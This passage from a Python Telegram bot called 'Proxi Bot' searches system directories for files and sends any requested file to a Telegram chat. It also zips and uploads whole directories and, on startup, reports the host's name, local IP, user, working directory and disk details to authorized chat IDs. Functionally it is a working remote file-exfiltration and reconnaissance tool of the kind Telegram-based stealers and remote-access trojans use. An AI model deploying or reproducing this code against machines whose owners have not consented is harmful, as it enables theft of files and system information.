                msg = f"✅ Found {len(found)} files:\n\n"
                keyboard = []
                for i, (fname, fpath, fsize) in enumerate(found, 1):
                    size_mb = fsize / (1024 * 1024)
                    msg += f"{i}. {fname} ({size_mb:.1f}MB)\n"
                    btn = InlineKeyboardButton(f"📥 {fname}", callback_data=f"direct_dl_{i-1}")
                    keyboard.append([btn])
                
                keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
                
                await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
                context.user_data['search_results'] = found
            else:
                await update.message.reply_text("❌ Not found")
            
            context.user_data['mode'] = ''
        
        elif mode == 'send_file':
            # Send specific file
            if os.path.exists(text) and os.path.isfile(text):
                try:
                    file_size = os.path.getsize(text)
                    if file_size > MAX_FILE_SIZE:
                        await update.message.reply_text(f"❌ File too large: {file_size / (1024**2):.2f}MB")
                    else:
                        with open(text, 'rb') as f:
                            await update.message.reply_document(document=f)
                        await update.message.reply_text("✅ File sent!")
                except Exception as e:
                    await update.message.reply_text(f"❌ Error: {str(e)}")
            else:
                await update.message.reply_text("❌ File not found")
            
            context.user_data['mode'] = ''
        
        elif mode == 'create_zip':
            # Create ZIP from directory
            if os.path.exists(text) and os.path.isdir(text):
                zip_name = f"archive_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
                zip_path = os.path.join(TEMP_DIR, zip_name)
                
                await update.message.reply_text("🗜️ Creating ZIP...")
                
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for root, _, files in os.walk(text):
                        for file in files:
                            fpath = os.path.join(root, file)
                            arcname = os.path.relpath(fpath, text)
                            try:
                                zf.write(fpath, arcname)
                            except:
                                pass
                
                with open(zip_path, 'rb') as f:
                    await update.message.reply_document(document=f, filename=zip_name)
                
                os.remove(zip_path)
                await update.message.reply_text("✅ ZIP created!")
            else:
                await update.message.reply_text("❌ Directory not found")
            
            context.user_data['mode'] = ''
        
        elif mode == 'advanced_search':
            # Advanced pattern search
            found = []
            dirs = get_platform_directories()
            pattern = text.replace('*', '').lower()
            
            for directory in dirs:
                try:
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if pattern in file.lower():
                                fpath = os.path.join(root, file)
                                try:
                                    fsize = os.path.getsize(fpath)
                                    if fsize < MAX_FILE_SIZE:
                                        found.append((file, fpath, fsize))
                                except:
                                    pass
                            if len(found) >= 50:
                                break
                        if len(found) >= 50:
                            break
                except:
                    continue
            
            if found:
                msg = f"✅ Found {len(found)} matches:\n\n"
                keyboard = []
                for i, (fname, fpath, fsize) in enumerate(found[:30], 1):
                    size_mb = fsize / (1024 * 1024)
                    msg += f"{i}. {fname} ({size_mb:.1f}MB)\n"
                    btn = InlineKeyboardButton(f"📥 {fname}", callback_data=f"direct_dl_{i-1}")
                    keyboard.append([btn])
                
                keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
                await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
                context.user_data['search_results'] = found
            else:
                await update.message.reply_text("❌ No matches")
            
            context.user_data['mode'] = ''
    
    except Exception as e:
        logger.error(f"Error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Error: {context.error}")

def main():
    """Start the bot"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("download", download_command))
    app.add_handler(CommandHandler("preview", preview_command))
    app.add_handler(CommandHandler("live", live_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    app.add_error_handler(error_handler)
    
    # Send startup info on bot start
    async def send_startup_info(app: Application):
        """Send system info to authorized chat on startup"""
        try:
            sys_info = get_system_info()
            
            # Simple text format to avoid markdown parsing issues
            debug_msg = f"""BOT STARTED - DEBUG INFO

Time: {sys_info.get('timestamp', 'N/A')}

SYSTEM INFORMATION:
OS: {sys_info.get('platform')} {sys_info.get('platform_release')}
Python: {sys_info.get('python_version')}
Architecture: {sys_info.get('architecture')}

NETWORK & SYSTEM:
Hostname: {sys_info.get('hostname')}
Local IP: {sys_info.get('local_ip')}
User: {sys_info.get('user')}
Working Dir: {sys_info.get('working_dir')}

DISK INFORMATION:
Total: {sys_info.get('disk_total')}
Used: {sys_info.get('disk_used')}
Free: {sys_info.get('disk_free')}
Usage: {sys_info.get('disk_percent')}

BOT CONFIGURATION:
Temp Dir: {sys_info.get('temp_dir')}
Authorized Users: {sys_info.get('authorized_chats')}
Max File Size: 100 MB
Search Limit: 150 files

Status: ONLINE AND READY
"""
            
            # Send to all authorized chat IDs
            for chat_id in ALLOWED_CHAT_IDS:
                try:
                    await app.bot.send_message(
                        chat_id=chat_id,
                        text=debug_msg

                    )
                    logger.info(f"✅ Debug info  {chat_id}")
                except Exception as e:
                    logger.error(f"Failed to send message to {chat_id}: {e}")
        except Exception as e:
            logger.error(f"Error sending startup info: {e}")
    
    # Add post_init callback
    app.post_init = send_startup_info
    
    logger.info("🤖 Bot starting...")
    logger.info("✅ Bot is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    print("🚀 Starting Proxi Bot...")
    print(f"Platform: {platform.system()}")
    print(f"Python: {platform.python_version()}")
    main()
